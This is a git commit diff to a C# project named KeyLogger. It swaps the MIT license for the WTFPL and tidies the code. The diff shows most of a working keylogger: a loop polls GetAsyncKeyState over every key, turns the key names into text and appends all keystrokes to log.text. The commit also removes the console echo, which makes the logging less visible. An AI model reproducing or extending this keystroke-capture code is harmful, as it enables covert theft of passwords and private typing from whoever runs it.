557643cfda2c88134a4253c9db254dacaad80370
Henkje <henkje@pm.me>
2019-05-21 10:06:26 +0200

    Updated license

--- KeyLogger/Program.cs
+++ KeyLogger/Program.cs
@@ -1,22 +1,17 @@
 /* KeyLogger
  * 
- * Copyright (c) 2019 henkje
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
+ *              DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
+ *                      Version 2, December 2004
  *
- * The above copyright notice and this permission notice shall be included in all
- * copies or substantial portions of the Software.
+ * Copyright (C) 2019 henkje (henkje@pm.me)
  *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+ * Everyone is permitted to copy and distribute verbatim or modified
+ * copies of this license document, and changing it is allowed as long as the name is changed.
+ *
+ * DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
+ * TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
+ *
+ * 0. You just DO WHAT THE FUCK YOU WANT TO.
  */
 
 using System;
@@ -29,7 +24,7 @@ namespace KeyLogger
 {
     class Program
     {
-        //Delay, used when no key is pressed
+        //Delay, used when no key is pressed to reduce cpu usage.
         const short Delay = 50;
 
         [DllImport("user32.dll")]
@@ -38,16 +33,20 @@ namespace KeyLogger
 
         static void Main()
         {
-            int keys = Enum.GetValues(typeof(Keys)).Length;//Get the length of avaible keys.
+            int keysCount = Enum.GetValues(typeof(Keys)).Length;//Get the length of avaible keys.
 
             while (true)
             {
-                for (int i = 0; i < keys; i++)//Loop every key.
+                for (int i = 0; i < keysCount; i++)//Loop for every key.
                     if (GetAsyncKeyState(i) == -32767)//Check if key is pressed.
-                        key += Enum.GetName(typeof(Keys), i);//Add key as string to _Keys.
+                        key += Enum.GetName(typeof(Keys), i);//Add key as string to Keys.
 
                 //If no key is pressed, wait x milliseconds.
-                if (key.Length <= 0) { Task.Delay(Delay).Wait(); continue; }
+                if (key.Length <= 0)
+                {
+                    Task.Delay(Delay).Wait();
+                    continue;
+                }
 
                 //Key is pressed, continue.
                 //Ingenore LButton and RButton, these are mouse clicks.
@@ -57,7 +56,6 @@ namespace KeyLogger
                 key = key.Replace("Enter", Environment.NewLine);//Replace Enter for a new line.
                 key = key.Replace("Space", " ");//Replace Space for a real space.
 
-                Console.WriteLine(key);
                 File.AppendAllText("log.text", key);//Write key to file.
                 key = string.Empty;//clear key.
             }
